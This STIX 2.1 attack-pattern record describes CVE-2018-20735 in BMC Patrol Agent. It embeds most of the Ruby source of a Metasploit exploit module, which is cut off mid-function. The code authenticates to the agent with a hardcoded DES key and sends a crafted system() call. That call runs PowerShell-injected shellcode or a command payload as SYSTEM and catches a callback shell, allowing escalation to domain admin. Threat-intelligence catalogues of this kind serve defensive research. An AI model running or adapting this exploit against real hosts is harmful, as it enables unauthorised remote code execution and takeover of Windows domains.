{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--82ba0a26-9915-4d1c-953e-470456368957",
    "created": "2024-08-14T17:06:30.64238Z",
    "modified": "2024-08-14T17:06:30.642384Z",
    "name": "BMC Patrol Agent Privilege Escalation Cmd Execution",
    "description": "( This module leverages the remote command execution feature provided by the BMC Patrol Agent software. It can also be used to escalate privileges on Windows hosts as the software runs as SYSTEM but only verfies that the password of the provided user is correct. This also means if the software is running on a domain controller, it can be used to escalate from a normal domain user to domain admin as SYSTEM on a DC is DA. **WARNING** The windows version of this exploit uses powershell to execute the payload. The powershell version tends to timeout on the first run so it may take multiple tries. ) 'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/misc/bmc_patrol_cmd_exec.rb",
            "external_id": "bmc_patrol_cmd_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-20735"
        },
        {
            "source_name": "reference",
            "url": "https://www.securifera.com/blog/2018/12/17/bmc-patrol-agent-domain-user-to-domain-admin/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\nrequire 'zlib'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Powershell\n\n  @deflater = nil\n  @inflater = nil\n\n  SBOXES = [\n    0x20022000, 0x20000000, 0x0, 0x20022000, 0x0, 0x20022000, 0x20000000, 0x0, 0x20022000,\n    0x20022000, 0x20000000, 0x22000, 0x22000, 0x0, 0x0, 0x20000000, 0x20000000, 0x0,\n    0x22000, 0x20022000, 0x20022000, 0x20000000, 0x22000, 0x22000, 0x0, 0x22000,\n    0x20022000, 0x20000000, 0x22000, 0x22000, 0x20000000, 0x0, 0x0, 0x20022000, 0x22000,\n    0x20000000, 0x20022000, 0x20000000, 0x22000, 0x22000, 0x20000000, 0x22000,\n    0x20022000, 0x0, 0x20022000, 0x0, 0x0, 0x20000000, 0x20022000, 0x20022000, 0x20000000,\n    0x22000, 0x0, 0x22000, 0x20000000, 0x0, 0x20000000, 0x0, 0x22000, 0x20022000, 0x0,\n    0x20000000, 0x22000, 0x20022000, 0x802, 0x2, 0x8000800, 0x8000802, 0x800, 0x8000002,\n    0x8000002, 0x8000800, 0x8000002, 0x802, 0x802, 0x8000000, 0x8000800, 0x800,\n    0x0, 0x8000002, 0x2, 0x8000000, 0x800, 0x2, 0x8000802, 0x802, 0x8000000, 0x800, 0x8000000,\n    0x0, 0x2, 0x8000802, 0x0, 0x8000800, 0x8000802, 0x0, 0x0, 0x8000802, 0x800, 0x8000002,\n    0x802, 0x2, 0x8000000, 0x800, 0x8000802, 0x0, 0x2, 0x8000800, 0x8000002, 0x8000000,\n    0x8000800, 0x802, 0x8000802, 0x2, 0x802, 0x8000800, 0x800, 0x8000000, 0x8000002,\n    0x0, 0x2, 0x800, 0x8000800, 0x802, 0x8000000, 0x8000802, 0x0, 0x8000002, 0x2200004,\n    0x0, 0x2200000, 0x0, 0x4, 0x2200004, 0x2200000, 0x2200000, 0x2200000, 0x4, 0x4, 0x2200000,\n    0x4, 0x2200000, 0x0, 0x4, 0x0, 0x2200004, 0x4, 0x2200000, 0x2200004, 0x0, 0x0, 0x4, 0x2200004,\n    0x2200004, 0x2200000, 0x4, 0x0, 0x0, 0x2200004, 0x2200004, 0x4, 0x2200000, 0x2200000,\n    0x2200004, 0x2200004, 0x4, 0x4, 0x0, 0x0, 0x2200004, 0x0, 0x4, 0x2200000, 0x0, 0x2200004,\n    0x2200004, 0x2200000, 0x2200000, 0x0, 0x4, 0x4, 0x2200004, 0x2200000, 0x0, 0x4, 0x0,\n    0x2200004, 0x2200000, 0x2200004, 0x4, 0x0, 0x2200000, 0x1100004, 0x0, 0x4, 0x1100004,\n    0x1100000, 0x0, 0x1100000, 0x4, 0x0, 0x1100004, 0x0, 0x1100000, 0x4, 0x1100004, 0x1100004,\n    0x0, 0x4, 0x1100000, 0x1100004, 0x0, 0x4, 0x1100000, 0x0, 0x4, 0x1100000, 0x4, 0x1100004,\n    0x1100000, 0x1100000, 0x4, 0x0, 0x1100004, 0x4, 0x1100004, 0x1100000, 0x4, 0x1100004,\n    0x4, 0x1100000, 0x0, 0x1100000, 0x0, 0x4, 0x1100004, 0x0, 0x1100000, 0x4, 0x1100000,\n    0x1100004, 0x0, 0x0, 0x1100000, 0x0, 0x1100004, 0x4, 0x1100004, 0x1100004, 0x4, 0x0,\n    0x1100000, 0x1100000, 0x0, 0x1100004, 0x4, 0x0, 0x10000400, 0x400, 0x400, 0x10000000,\n    0x0, 0x400, 0x10000400, 0x400, 0x10000000, 0x10000000, 0x0, 0x10000400, 0x400,\n    0x0, 0x10000000, 0x0, 0x10000000, 0x10000400, 0x400, 0x400, 0x10000400, 0x10000000,\n    0x0, 0x10000000, 0x400, 0x10000400, 0x10000000, 0x10000400, 0x0, 0x0, 0x10000400,\n    0x10000400, 0x400, 0x0, 0x10000000, 0x400, 0x10000000, 0x10000000, 0x400, 0x0,\n    0x10000400, 0x10000400, 0x10000000, 0x10000000, 0x0, 0x10000400, 0x0, 0x10000400,\n    0x0, 0x0, 0x10000400, 0x10000000, 0x400, 0x400, 0x10000400, 0x400, 0x0, 0x10000000,\n    0x400, 0x0, 0x10000400, 0x400, 0x10000000, 0x4011000, 0x11001, 0x0, 0x4011000,\n    0x4000001, 0x11000, 0x4011000, 0x1, 0x11000, 0x1, 0x11001, 0x4000000, 0x4011001,\n    0x4000000, 0x4000000, 0x4011001, 0x0, 0x4000001, 0x11001, 0x0, 0x4000000, 0x4011001,\n    0x1, 0x4011000, 0x4011001, 0x11000, 0x4000001, 0x11001, 0x1, 0x0, 0x11000, 0x4000001,\n    0x11001, 0x0, 0x4000000, 0x1, 0x4000000, 0x4000001, 0x11001, 0x4011000, 0x0, 0x11001,\n    0x1, 0x4011001, 0x4000001, 0x11000, 0x4011001, 0x4000000, 0x4000001, 0x4011000,\n    0x11000, 0x4011001, 0x1, 0x11000, 0x4011000, 0x1, 0x11000, 0x0, 0x4011001, 0x4000000,\n    0x4011000, 0x4000001, 0x0, 0x11001, 0x40002, 0x40000, 0x2, 0x40002, 0x0, 0x0, 0x40002,\n    0x2, 0x40000, 0x2, 0x0, 0x40002, 0x2, 0x40002, 0x0, 0x0, 0x2, 0x40000, 0x40000, 0x2, 0x40000,\n    0x40002, 0x0, 0x40000, 0x40002, 0x0, 0x2, 0x40000, 0x40000, 0x2, 0x40002, 0x0, 0x2, 0x40002,\n    0x0, 0x2, 0x40000, 0x40000, 0x2, 0x0, 0x40002, 0x0, 0x40000, 0x2, 0x0, 0x2, 0x40000, 0x40000,\n    0x0, 0x40002, 0x40002, 0x0, 0x40002, 0x2, 0x40000, 0x40002, 0x2, 0x40000, 0x0, 0x40002,\n    0x40002, 0x0, 0x2, 0x40000, 0x20000110, 0x40000, 0x20000000, 0x20040110, 0x0, 0x40110,\n    0x20040000, 0x20000110, 0x40110, 0x20040000, 0x40000, 0x20000000, 0x20040000,\n    0x20000110, 0x110, 0x40000, 0x20040110, 0x110, 0x0, 0x20000000, 0x110, 0x20040000,\n    0x40110, 0x0, 0x20000000, 0x0, 0x20000110, 0x40110, 0x40000, 0x20040110, 0x20040110,\n    0x110, 0x20040110, 0x20000000, 0x110, 0x20040000, 0x110, 0x40000, 0x20000000,\n    0x40110, 0x20040000, 0x0, 0x0, 0x20000110, 0x0, 0x20040110, 0x40110, 0x0, 0x40000,\n    0x20040110, 0x20000110, 0x110, 0x20040110, 0x20000000, 0x40000, 0x20000110,\n    0x20000110, 0x110, 0x40110, 0x20040000, 0x20000000, 0x40000, 0x20040000, 0x40110,\n    0x0, 0x4000000, 0x11000, 0x4011008, 0x4000008, 0x11000, 0x4011008, 0x4000000,\n    0x4000000, 0x8, 0x8, 0x4011000, 0x11008, 0x4000008, 0x4011000, 0x0, 0x4011000, 0x0,\n    0x4000008, 0x11008, 0x11000, 0x4011008, 0x0, 0x8, 0x8, 0x11008, 0x4011008, 0x4000008,\n    0x4000000, 0x11000, 0x11008, 0x4011000, 0x4011000, 0x11008, 0x4000008, 0x4000000,\n    0x4000000, 0x8, 0x8, 0x11000, 0x0, 0x4011000, 0x4011008, 0x0, 0x4011008, 0x0, 0x11000,\n    0x4000008, 0x11008, 0x11000, 0x0, 0x4011008, 0x4000008, 0x4011000, 0x11008, 0x4000000,\n    0x4011000, 0x4000008, 0x11000, 0x11008, 0x8, 0x4011008, 0x4000000, 0x8, 0x22000,\n    0x0, 0x0, 0x22000, 0x22000, 0x22000, 0x0, 0x22000, 0x0, 0x0, 0x22000, 0x0, 0x22000, 0x22000,\n    0x22000, 0x0, 0x0, 0x22000, 0x0, 0x0, 0x22000, 0x0, 0x0, 0x22000, 0x0, 0x22000, 0x22000,\n    0x0, 0x22000, 0x0, 0x0, 0x22000, 0x22000, 0x22000, 0x0, 0x22000, 0x0, 0x0, 0x22000, 0x22000,\n    0x22000, 0x0, 0x22000, 0x0, 0x0, 0x22000, 0x0, 0x0, 0x22000, 0x0, 0x0, 0x22000, 0x22000,\n    0x22000, 0x0, 0x0, 0x0, 0x22000, 0x22000, 0x0, 0x0, 0x0, 0x22000, 0x22000, 0x110, 0x110,\n    0x0, 0x80000, 0x110, 0x80000, 0x80110, 0x0, 0x80110, 0x80110, 0x80000, 0x0, 0x80000,\n    0x110, 0x0, 0x80110, 0x0, 0x80110, 0x110, 0x0, 0x80000, 0x110, 0x80000, 0x110, 0x80110,\n    0x0, 0x0, 0x80110, 0x110, 0x80000, 0x80110, 0x80000, 0x80110, 0x0, 0x80000, 0x80110,\n    0x80000, 0x110, 0x0, 0x80000, 0x0, 0x80000, 0x110, 0x0, 0x110, 0x80110, 0x80000, 0x110,\n    0x80110, 0x80000, 0x0, 0x80110, 0x110, 0x0, 0x80110, 0x0, 0x80000, 0x110, 0x80110,\n    0x80000, 0x0, 0x80110, 0x110, 0x110, 0x2200000, 0x8, 0x0, 0x2200008, 0x8, 0x0, 0x2200000,\n    0x8, 0x0, 0x2200008, 0x8, 0x2200000, 0x2200000, 0x2200000, 0x2200008, 0x8, 0x8, 0x2200000,\n    0x2200008, 0x0, 0x0, 0x0, 0x2200008, 0x2200008, 0x2200008, 0x2200008, 0x2200000,\n    0x0, 0x0, 0x8, 0x8, 0x2200000, 0x0, 0x2200000, 0x2200000, 0x8, 0x2200008, 0x8, 0x0, 0x2200000,\n    0x2200000, 0x0, 0x2200008, 0x8, 0x8, 0x2200008, 0x8, 0x0, 0x2200008, 0x8, 0x8, 0x2200000,\n    0x2200000, 0x2200008, 0x8, 0x0, 0x0, 0x2200000, 0x2200000, 0x2200008, 0x2200008,\n    0x0, 0x0, 0x2200008, 0x1100000, 0x800, 0x800, 0x1, 0x1100801, 0x1100001, 0x1100800,\n    0x0, 0x0, 0x801, 0x801, 0x1100000, 0x1, 0x1100800, 0x1100000, 0x801, 0x801, 0x1100000,\n    0x1100001, 0x1100801, 0x0, 0x800, 0x1, 0x1100800, 0x1100001, 0x1100801, 0x1100800,\n    0x1, 0x1100801, 0x1100001, 0x800, 0x0, 0x1100801, 0x1100000, 0x1100001, 0x801,\n    0x1100000, 0x800, 0x0, 0x1100001, 0x801, 0x1100801, 0x1100800, 0x0, 0x800, 0x1, 0x1,\n    0x800, 0x0, 0x801, 0x800, 0x1100800, 0x801, 0x1100000, 0x1100801, 0x0, 0x1100800,\n    0x1, 0x1100001, 0x1100801, 0x1, 0x1100800, 0x1100000, 0x1100001, 0x0, 0x0, 0x400,\n    0x10000400, 0x10000400, 0x10000000, 0x0, 0x0, 0x400, 0x10000400, 0x10000000, 0x400,\n    0x10000000, 0x400, 0x400, 0x10000000, 0x10000400, 0x0, 0x10000000, 0x10000400,\n    0x0, 0x400, 0x10000400, 0x0, 0x10000400, 0x10000000, 0x400, 0x10000000, 0x10000000,\n    0x10000400, 0x0, 0x400, 0x10000000, 0x400, 0x10000400, 0x10000000, 0x0, 0x0, 0x400,\n    0x10000400, 0x10000400, 0x10000000, 0x0, 0x0, 0x0, 0x10000400, 0x10000000, 0x400,\n    0x0, 0x10000400, 0x400, 0x0, 0x10000000, 0x0, 0x10000400, 0x400, 0x400, 0x10000000,\n    0x10000000, 0x10000400, 0x10000400, 0x400, 0x400, 0x10000000, 0x220, 0x8000000,\n    0x8000220, 0x0, 0x8000000, 0x220, 0x0, 0x8000220, 0x220, 0x0, 0x8000000, 0x8000220,\n    0x8000220, 0x8000220, 0x220, 0x0, 0x8000000, 0x8000220, 0x220, 0x8000000, 0x8000220,\n    0x220, 0x0, 0x8000000, 0x0, 0x0, 0x8000220, 0x220, 0x0, 0x8000000, 0x8000000, 0x220,\n    0x0, 0x8000000, 0x220, 0x8000220, 0x8000220, 0x0, 0x0, 0x8000000, 0x220, 0x8000220,\n    0x8000000, 0x220, 0x8000000, 0x220, 0x220, 0x8000000, 0x8000220, 0x0, 0x0, 0x220,\n    0x8000000, 0x8000220, 0x8000220, 0x0, 0x220, 0x8000000, 0x8000220, 0x0, 0x0, 0x220,\n    0x8000000, 0x8000220, 0x80220, 0x80220, 0x0, 0x0, 0x80000, 0x220, 0x80220, 0x80220,\n    0x0, 0x80000, 0x220, 0x0, 0x220, 0x80000, 0x80000, 0x80220, 0x0, 0x220, 0x220, 0x80000,\n    0x80220, 0x80000, 0x0, 0x220, 0x80000, 0x220, 0x80000, 0x80220, 0x220, 0x0, 0x80220,\n    0x0, 0x220, 0x0, 0x80000, 0x80220, 0x0, 0x80000, 0x0, 0x220, 0x80220, 0x80000, 0x80000,\n    0x220, 0x80220, 0x0, 0x220, 0x80000, 0x80220, 0x220, 0x80220, 0x80000, 0x220, 0x0,\n    0x80000, 0x80220, 0x0, 0x80220, 0x220, 0x0, 0x80000, 0x80220, 0x0, 0x220\n  ].freeze\n\n  PC1 = \"\\x38\\x30\\x28\\x20\\x18\\x10\\x8\\x0\\x39\\x31\\x29\\x21\\x19\\x11\\x9\"\\\n  \"\\x1\\x3A\\x32\\x2A\\x22\\x1A\\x12\\x0A\\x2\\x3B\\x33\\x2B\\x23\\x3E\\x36\"\\\n  \"\\x2E\\x26\\x1E\\x16\\x0E\\x6\\x3D\\x35\\x2D\\x25\\x1D\\x15\\x0D\\x5\\x3C\"\\\n  \"\\x34\\x2C\\x24\\x1C\\x14\\x0C\\x4\\x1B\\x13\\x0B\\x3\\x0\\x0\\x0\\x0\\x0\\x0\\x0\\x0\".freeze\n\n  PC2 = \"\\x0D\\x10\\x0A\\x17\\x0\\x4\\x2\\x1B\\x0E\\x5\\x14\\x9\\x16\\x12\\x0B\\x3\"\\\n  \"\\x19\\x7\\x0F\\x6\\x1A\\x13\\x0C\\x1\\x28\\x33\\x1E\\x24\\x2E\\x36\\x1D\"\\\n  \"\\x27\\x32\\x2C\\x20\\x2F\\x2B\\x30\\x26\\x37\\x21\\x34\\x2D\\x29\\x31\"\\\n  \"\\x23\\x1C\\x1F\".freeze\n\n  SBOX_BYTE_ORDER = [\n    1, 2, 4, 8, 0x10, 0x20, 0x40, 0x80, 0x100, 0x200, 0x400, 0x800, 0x1000, 0x2000,\n    0x4000, 0x8000, 0x10000, 0x20000, 0x40000, 0x80000, 0x100000, 0x200000, 0x400000,\n    0x800000, 0x1000000, 0x2000000, 0x4000000, 0x8000000, 0x10000000, 0x20000000,\n    0x40000000, 0x80000000\n  ].freeze\n\n  ROTATIONS = \"\\x1\\x1\\x2\\x2\\x2\\x2\\x2\\x2\\x1\\x2\\x2\\x2\\x2\\x2\\x2\\x1\".freeze\n  INIT_DES_KEY_0 = \"\\x9a\\xd3\\xbc\\x24\\x10\\xe2\\x8f\\x0e\".freeze\n  INIT_DES_KEY_1 = \"\\xe2\\x95\\x14\\x33\\x59\\xc3\\xec\\xa8\".freeze\n\n  DES_ENCRYPT = 0\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'BMC Patrol Agent Privilege Escalation Cmd Execution',\n      'Description'    => %q(\n        This module leverages the remote command execution feature provided by\n        the BMC Patrol Agent software. It can also be used to escalate privileges\n        on Windows hosts as the software runs as SYSTEM but only verfies that the password\n        of the provided user is correct. This also means if the software is running on a\n        domain controller, it can be used to escalate from a normal domain user to domain\n        admin as SYSTEM on a DC is DA. **WARNING** The windows version of this exploit uses\n        powershell to execute the payload. The powershell version tends to timeout on\n        the first run so it may take multiple tries.\n      ),\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'b0yd' # @rwincey / Vulnerability Discovery and MSF module author\n        ],\n      'References'     =>\n        [\n          ['CVE', '2018-20735'],\n          ['URL', 'https://www.securifera.com/blog/2018/12/17/bmc-patrol-agent-domain-user-to-domain-admin/']\n        ],\n      'Platform'       => ['win', 'linux'],\n      'Targets'        =>\n        [\n          [\n            'Windows Powershell Injected Shellcode', {\n              'Platform' => 'win'\n            }\n          ],\n          [\n            'Generic Command Callback', {\n              'Arch' => ARCH_CMD,\n              'Platform' => %w[linux unix win]\n            }\n          ]\n        ],\n      'Privileged'     => true,\n      'DefaultTarget'  => 0,\n      'DefaultOptions' => {\n        'DisablePayloadHandler' => true\n      },\n      'DisclosureDate' => '2019-01-17'))\n\n    register_options(\n      [\n        Opt::RPORT(3181),\n        OptString.new('USER',     [true,  'local or domain user to authenticate with patrol', 'patrol']),\n        OptString.new('PASSWORD', [true,  'password to authenticate with patrol', 'password']),\n        OptString.new('CMD',      [false, 'command to run on the target. If this option is specified the payload will be ignored.'])\n      ]\n    )\n\n  end\n\n  def cleanup\n    disconnect\n    print_status(\"Disconnected from BMC Patrol Agent.\")\n    @inflater.close\n    @deflater.close\n    super\n  end\n\n  def get_target_os(srv_info_msg)\n    lines = srv_info_msg.split(\"\\n\")\n    fail_with(Failure::UnexpectedReply, \"Invalid server info msg.\") if lines[0] != \"MS\" && lines[1] != \"{\" && lines[-1] != \"}\"\n\n    os = nil\n    ver = nil\n    lines[2..-2].each do |i|\n      val = i.split(\"=\")\n      if val.length == 2\n        if val[0].strip! == \"T\"\n          os = val[1]\n        elsif val[0].strip! == \"VER\"\n          ver = val[1]\n        end\n      end\n    end\n    [os, ver]\n  end\n\n  def get_cmd_output(cmd_output_msg)\n\n    lines = cmd_output_msg.split(\"\\n\")\n    fail_with(Failure::UnexpectedReply, \"Invalid command output msg.\") if lines[0] != \"PEM_MSG\" && lines[1] != \"{\" && lines[-1] != \"}\"\n\n    # Parse out command results\n    idx_start = cmd_output_msg.index(\"Result\\x00\")\n    idx_end = cmd_output_msg.index(\"RemPsl_user\")\n    output = cmd_output_msg[idx_start + 7..idx_end - 1]\n\n    output\n  end\n\n  def exploit\n\n    # Manually start the handler if not running a single command\n    if datastore['CMD'].nil? || datastore['CMD'].empty?\n\n      # Set to nil if the cmd is empty for checks further down\n      datastore['CMD'] = nil\n      datastore['DisablePayloadHandler'] = false\n\n      # Configure the payload handler\n      payload_instance.exploit_config = {\n        'active_timeout' => 300\n      }\n      # Setup the payload handler\n      payload_instance.setup_handler\n\n      # Start the payload handler\n      payload_instance.start_handler\n\n    end\n\n    # Initialize zlib objects\n    @deflater = Zlib::Deflate.new(4, 15, Zlib::MAX_MEM_LEVEL, Zlib::DEFAULT_STRATEGY)\n    @inflater = Zlib::Inflate.new\n\n    # Connect to the BMC Patrol Agent\n    connect\n    print_status(\"Connected to BMC Patrol Agent.\")\n\n    # Create session msg\n    create_session\n    ret_data = receive_msg\n    fail_with(Failure::UnexpectedReply, \"Failed to receive session confirmation. Aborting.\") if ret_data.nil?\n\n    # Authenticate\n    authenticate_user(datastore['USER'], datastore['PASSWORD'])\n\n    # Receive the authentication response\n    ret_data = receive_msg\n    fail_with(Failure::UnexpectedReply, \"Failed to receive authentication response. Aborting.\") if ret_data.nil?\n\n    ret_msg = process_response(ret_data)\n    if ret_msg =~ /logged in/\n      print_status(\"Successfully authenticated user.\")\n    else\n      fail_with(Failure::UnexpectedReply, \"Login failed. Aborting.\")\n    end\n\n    # Receive the server info\n    ret_data = receive_msg\n    fail_with(Failure::UnexpectedReply, \"Failed to receive server info msg. Aborting.\") if ret_data.nil?\n    srv_info = process_response(ret_data)\n\n    # Get the target's OS from their info msg\n    target_os = get_target_os(srv_info)\n\n    # When using autotargeting, MSF selects the Windows meterpreter as the default payload.\n    # Fail if this is the case and ask the user to select an appropriate payload.\n    if target_os[0] == 'Linux' && payload_instance.name =~ /Windows/ && datastore['CMD'].nil?\n      fail_with(Failure::BadConfig, \"#{peer} - Select a compatible payload for this Linux target.\")\n    end\n\n    target_name = target.name\n    if !datastore['CMD'].nil?\n      command = datastore['CMD'].tr('\"', '\\\"')\n      print_status(\"Command to execute: #{command}\")\n    elsif target_name == 'Windows Powershell Injected Shellcode'\n      # Get encoded powershell of payload\n      command = cmd_psh_payload(payload.encoded, payload_instance.arch.first, encode_final_payload: true, method: 'reflection')\n    else\n      command = payload.raw.tr('\"', '\\\"')\n    end\n\n    # Run command\n    run_cmd(command)\n\n    # Receive command confirmation\n    ret_data = receive_msg\n    if !ret_data.nil?\n      process_response(ret_data)\n    end\n\n    # Receive command output\n    ret_data = receive_msg\n    if !ret_data.nil? && !datastore['CMD'].nil?\n      cmd_result_data = process_response(ret_data)\n      cmd_result = get_cmd_output(cmd_result_data)\n      print_status(\"Output:\\n#{cmd_result}\")\n    end\n\n    # Handle the shell\n    handler\n\n  end\n\n  def receive_msg\n\n    header = sock.get_once(6)\n    if header.nil?\n      return\n    end\n\n    payload_size_arr = header[0, 4]\n    payload_size = payload_size_arr.unpack1(\"N\")\n    payload = ''\n    if payload_size > 0\n      payload = sock.get_once(payload_size)\n      if payload.nil?\n        return\n      end\n    end\n\n    return header + payload\n\n  end\n\n  def send_msg(type, compression, data)\n\n    data_len = data.length\n    buf = [data_len].pack('N')\n\n    # Set the type\n    buf += [type].pack('C')\n\n    # Set compression flag\n    buf += [compression].pack('C')\n\n    # Add data\n    buf += data\n\n    # Send msg\n    sock.put(buf)\n\n  end\n\n  def process_response(ret_data)\n\n    # While style checks complain, I intend to leave this parsing\n    # in place for debugging purposes\n    ret_size_arr = ret_data[0, 4]\n    ret_size = ret_size_arr.unpack1(\"N\") # rubocop:disable Lint/UselessAssignment\n\n    msg_type = ret_data[4, 1] # rubocop:disable Lint/UselessAssignment\n    comp_flag = ret_data[5, 1]\n\n    payload_data = ret_data[6..-1]\n    if comp_flag == \"\\x00\"\n      bin_data = payload_data.unpack1(\"H*\") # rubocop:disable Lint/UselessAssignment\n      payload_data = @inflater.inflate(payload_data)\n    end\n\n    return payload_data\n\n  end\n\n  def run_cmd(cmd)\n\n    user_num = rand 1000..9999\n    msg_1 = %(R_E\n{\n\\tRE_ID=1\n\\tRE_PDESC=0\\tRemPsl\\tsystem(\"#{cmd}\");\\tRemPsl_user_#{user_num}\n\\tRE_ORG=PemApi\n\\tRE_SEV=1\n\\tRE_NSEV=5\n\\tRE_ST=\n}\n)\n\n    msg_1 += \"\\x00\"\n    # Compress the message\n    comp_data = @deflater.deflate msg_1, Zlib::SYNC_FLUSH\n    send_msg(0x44, 0x0, comp_data)\n\n  end\n\n  def identify(user)\n\n    inner_len = 15\n    msg_type = 8\n    len_str = [inner_len].pack(\"N\")\n    msg_str = [msg_type].pack(\"N\")\n    msg_1 = %(PEM_MSG\n{\n\\tNSDL=#{inner_len}\n\\tPEM_DGRAM=#{len_str}#{msg_str}#{user}\\x00\n}\n)\n    msg_1 += \"\\x00\"\n    print_status(\"Msg: #{msg_1}\")\n    bin_data = msg_1.unpack1(\"H*\") # rubocop:disable Lint/UselessAssignment\n    # Compress the message\n    comp_data = @deflater.deflate msg_1, Zlib::SYNC_FLUSH\n    send_msg(0x44, 0x0, comp_data)\n\n  end\n\n  def create_session\n    sess_msg = \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x05\\x02\\x00\\x04\\x02\\x04\\x03\\x10\\x00\\x00\\x03\\x04\\x00\\x00\\x00\\x00\\x01\\x01\\x04\\x00\\xff\\x00\\x00\\x00\"\n    sess_msg += \"\\x00\" * 0x68\n    send_msg(0x45, 0x2, sess_msg)\n  end\n\n  def authenticate_user(user, password)\n    # Default encryption key\n    enc_key = 'k$C4}@\"_'\n    output_data = des_crypt_func(password, enc_key, DES_ENCRYPT)\n    # Convert to hex string\n    encrpted_pw = output_data.unpack1(\"H*\")\n    des_pw = encrpted_pw.upcase\n\n    msg_1 = %(ID\n{\n\\tHOST=user\n\\tUSER=#{user}\n\\tPASS=#{des_pw}\n\\tVER=V9.6.00\n\\tT=PEMAPI\n\\tHTBT=1\n\\tTMOT=1728000\n\\tRTRS=3\n}\n)\n\n    msg_1 += \"\\x00\"\n    comp_data = @deflater.deflate msg_1, Zlib::SYNC_FLUSH\n    send_msg(0x44, 0x0, comp_data)\n\n  end\n\n  def rotate_block_init(input_block_tuple)\n\n    v6 = 0\n    v5 = 0\n    input_block_tuple = input_block_tuple.pack(\"V*\").unpack(\"i*\")\n    v3 = input_block_tuple[0]\n    v4 = input_block_tuple[1]\n\n    if (v4 & 0x2000000) != 0\n      v5 = 1\n    end\n    if (v4 & 0x20000) != 0\n      v5 |= 2\n    end\n    if (v4 & 0x200) != 0\n      v5 |= 4\n    end\n    if (v4 & 2) != 0\n      v5 |= 8\n    end\n    if (v3 & 0x2000000) != 0\n      v5 |= 0x10\n    end\n    if (v3 & 0x20000) != 0\n      v5 |= 0x20\n    end\n    if (v3 & 0x200) != 0\n      v5 |= 0x40\n    end\n    if (v3 & 2) != 0\n      v5 |= 0x80\n    end\n    if (v4 & 0x8000000) != 0\n      v5 |= 0x100\n    end\n    if (v4 & 0x80000) != 0\n      v5 |= 0x200\n    end\n    if (v4 & 0x800) != 0\n      v5 |= 0x400\n    end\n    if (v4 & 8) != 0\n      v5 |= 0x800\n    end\n    if (v3 & 0x8000000) != 0\n      v5 |= 0x1000\n    end\n    if (v3 & 0x80000) != 0\n      v5 |= 0x2000\n    end\n    if (v3 & 0x800) != 0\n      v5 |= 0x4000\n    end\n    if (v3 & 8) != 0\n      v5 |= 0x8000\n    end\n    if (v4 & 0x20000000) != 0\n      v5 |= 0x10000\n    end\n    if (v4 & 0x200000) != 0\n      v5 |= 0x20000\n    end\n    if (v4 & 0x2000) != 0\n      v5 |= 0x40000\n    end\n    if (v4 & 0x20) != 0\n      v5 |= 0x80000\n    end\n    if (v3 & 0x20000000) != 0\n      v5 |= 0x100000\n    end\n    if (v3 & 0x200000) != 0\n      v5 |= 0x200000\n    end\n    if (v3 & 0x2000) != 0\n      v5 |= 0x400000\n    end\n    if (v3 & 0x20) != 0\n      v5 |= 0x800000\n    end\n    if (v4 < 0)\n      v5 |= 0x1000000\n    end\n    if (v4 & 0x800000) != 0\n      v5 |= 0x2000000\n    end\n    if (v4 & 0x8000) != 0\n      v5 |= 0x4000000\n    end\n    if (v4 & 0x80) != 0\n      v5 |= 0x8000000\n    end\n    if (v3 < 0)\n      v5 |= 0x10000000\n    end\n    if (v3 & 0x800000) != 0\n      v5 |= 0x20000000\n    end\n    if (v3 & 0x8000) != 0\n      v5 |= 0x40000000\n    end\n    if (v3 & 0x80) != 0\n      v5 |= 0x80000000\n    end\n    if (v4 & 0x1000000) != 0\n      v6 = 1\n    end\n    if (v4 & 0x10000) != 0\n      v6 |= 2\n    end\n    if (v4 & 0x100) != 0\n      v6 |= 4\n    end\n    if (v4 & 1) != 0\n      v6 |= 8\n    end\n    if (v3 & 0x1000000) != 0\n      v6 |= 0x10\n    end\n    if (v3 & 0x10000) != 0\n      v6 |= 0x20\n    end\n    if (v3 & 0x100) != 0\n      v6 |= 0x40\n    end\n    if (v3 & 1) != 0\n      v6 |= 0x80\n    end\n    if (v4 & 0x4000000) != 0\n      v6 |= 0x100\n    end\n    if (v4 & 0x40000) != 0\n      v6 |= 0x200\n    end\n    if (v4 & 0x400) != 0\n      v6 |= 0x400\n    end\n    if (v4 & 4) != 0\n      v6 |= 0x800\n    end\n    if (v3 & 0x4000000) != 0\n      v6 |= 0x1000\n    end\n    if (v3 & 0x40000) != 0\n      v6 |= 0x2000\n    end\n    if (v3 & 0x400) != 0\n      v6 |= 0x4000\n    end\n    if (v3 & 4) != 0\n      v6 |= 0x8000\n    end\n    if (v4 & 0x10000000) != 0\n      v6 |= 0x10000\n    end\n    if (v4 & 0x100000) != 0\n      v6 |= 0x20000\n    end\n    if (v4 & 0x1000) != 0\n      v6 |= 0x40000\n    end\n    if (v4 & 0x10) != 0\n      v6 |= 0x80000\n    end\n    if (v3 & 0x10000000) != 0\n      v6 |= 0x100000\n    end\n    if (v3 & 0x100000) != 0\n      v6 |= 0x200000\n    end\n    if (v3 & 0x1000) != 0\n      v6 |= 0x400000\n    end\n    if (v3 & 0x10) != 0\n      v6 |= 0x800000\n    end\n    if (v4 & 0x40000000) != 0\n      v6 |= 0x1000000\n    end\n    if (v4 & 0x400000) != 0\n      v6 |= 0x2000000\n    end\n    if (v4 & 0x4000) != 0\n      v6 |= 0x4000000\n    end\n    if (v4 & 0x40) != 0\n      v6 |= 0x8000000\n    end\n    if (v3 & 0x40000000) != 0\n      v6 |= 0x10000000\n    end\n    if (v3 & 0x400000) != 0\n      v6 |= 0x20000000\n    end\n    if (v3 & 0x4000) != 0\n      v6 |= 0x40000000\n    end\n    if (v3 & 0x40) != 0\n      v6 |= 0x80000000\n    end\n\n    # Create return tuple\n    ret_block = Array.new\n    ret_block.push v5\n    ret_block.push v6\n    ret_block\n  end\n\n  def rotate_block_final(input_block_tuple)\n\n    v6 = 0\n    v5 = 0\n    input_block_tuple = input_block_tuple.pack(\"V*\").unpack(\"i*\")\n    v3 = 